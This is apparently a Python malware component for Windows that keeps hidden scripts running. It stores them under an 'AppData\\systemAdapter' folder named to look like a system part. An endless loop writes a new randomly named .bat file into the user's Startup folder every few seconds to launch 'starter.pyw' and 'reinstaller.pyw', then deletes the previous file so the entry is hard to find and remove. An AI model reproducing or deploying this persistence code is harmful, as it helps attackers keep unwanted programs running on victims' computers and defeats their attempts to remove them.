import os.path
import os
from random import choice
from db import bat
import time

login = os.getlogin()
db = bat(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\db_bat.db")

file_path = f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\starter.pyw"
file_path_2 = f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\reinstaller.pyw"

all_files_bat = db.get_all_bat_files()
print(all_files_bat)
if len(all_files_bat) >= 2:
	after_files = len(all_files_bat) - 2

	for i in all_files_bat:
		try:
			os.remove(i[1])
		except FileNotFoundError:
			pass
		db.delete_bat_file(i[1])



while True:
	if os.path.exists(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemAdapter.bat"):
		os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemAdapter.bat")
	bat_path = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	for i in range(30):
		bat_path += choice("1234567890QWERTYUIOPASDFGHJKKLZXCVBNMqwertyuiopasdfghjklzxcvbnm")
	bat_path += ".bat"
	with open(bat_path, "w") as bat_file:
		bat_file.write(f"start {file_path}\nstart {file_path_2}")
	db.add_bat_file(bat_path)
	time.sleep(3)
	bat_file = db.get_bat_files()[1]
	try:
		os.remove(bat_file)
	except FileNotFoundError:
		pass
	db.delete_bat_file(bat_file)